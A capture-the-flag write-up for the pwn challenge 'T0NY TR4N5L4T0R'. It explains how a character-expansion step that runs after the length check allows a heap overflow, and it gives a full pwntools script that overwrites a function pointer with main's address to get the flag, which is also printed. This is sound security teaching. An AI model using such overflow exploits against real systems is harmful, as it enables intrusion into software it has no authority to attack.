# T0NY TR4N5L4T0R (pwn)
## problem
Tony Stark has entered the edgy hacker stage of life and decided to make his own competitor to Grammarly. His program has some glaring flaws. Can you be super 1337 and use these flaws to retireve his signature flag?

## Analysis
Put the binary in ghidra. In main function, we can get the flag if the value of `counter` variable is 2. In order to store 2 in `counter`, we have to call `main` function twice.

![counter](img/counter.png)

In below of `main` function, a value of heap is called. 

![func1](img/func1.png)  
![func2](img/func2.png)

But the size of our input must be less than 0x3d to call above.  
![size](img/size.png)

To gain more information, I analyzed the chunks of heap. 
* First from the top chunk is a buffer for receiving our input.
* Third from the top chunk is the pointer to `useless` function.  
  
![heap](img/heap.png)  

It seems that we can overwrite the pointer of function in third chunk if first chunk is vulnerable for overflow. But size of our input must be less than 0x3d. So the below gadget is useful to heap overflow.

![gadget](img/gadget.png)

some "a" of our input are trancerated to "/\\". And this operation is performed after defined the size of our input.


## Exploit
Use the above gadget, and overwrite the `func` pointer to `main`.
```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
HOST = "0.cloud.chals.io"
PORT = 26008

CHALL_BIN = "./leet"
gs = '''
b main
b *0x8049501
c
'''
elf = context.binary

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return gdb.debug([elf.path], gdbscript=gs)

def exploit():
    padding1 = b'a'*0x18 + b'p'*0x20
    io.sendline(padding1 + p32(elf.symbols["main"]))

io = start()
exploit()
io.interactive()
```
Flag: `shctf{Y00_175_70NY_574RK}`